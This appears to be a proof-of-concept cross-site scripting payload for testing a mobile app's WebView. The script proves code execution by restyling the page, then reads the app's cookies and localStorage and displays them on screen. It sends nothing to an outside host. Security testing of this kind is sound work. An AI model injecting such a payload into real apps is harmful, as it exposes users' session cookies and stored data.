<script>
    // 1. Prove we can run code (XSS)
    document.body.style.backgroundColor = "red";
    document.body.innerHTML = "<h1>Security Test</h1>";

    // 2. Try to read APP data (The critical part)
    // If the WebView shares storage with the rest of the app, this will not be empty.
    var cookies = document.cookie;
    var localStore = JSON.stringify(localStorage);

    // 3. Display the data
    document.body.innerHTML += 
        "<h3>App Cookies:</h3><div>" + (cookies || "None found") + "</div>" +
        "<h3>App Storage:</h3><div>" + (localStore || "None found") + "</div>";
</script>
